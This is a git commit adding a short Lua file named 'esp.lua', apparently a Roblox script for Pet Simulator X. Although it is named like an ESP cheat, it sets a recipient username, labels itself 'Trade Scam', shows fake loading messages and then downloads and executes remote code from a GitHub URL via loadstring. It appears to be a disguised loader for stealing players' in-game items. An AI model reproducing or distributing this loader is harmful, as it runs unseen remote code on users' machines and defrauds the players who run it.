79590f3c78b1a089f646b4507b97cdffa849acb3
Vandzo228 <127055213+Vandzo228@users.noreply.github.com>
2023-03-05 23:02:38 +0200

    Create esp.lua

---
+++ esp.lua
@@ -0,0 +1,8 @@
+Username = "despishin"
+ 
+_G.CustomScriptName = "Trade Scam"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
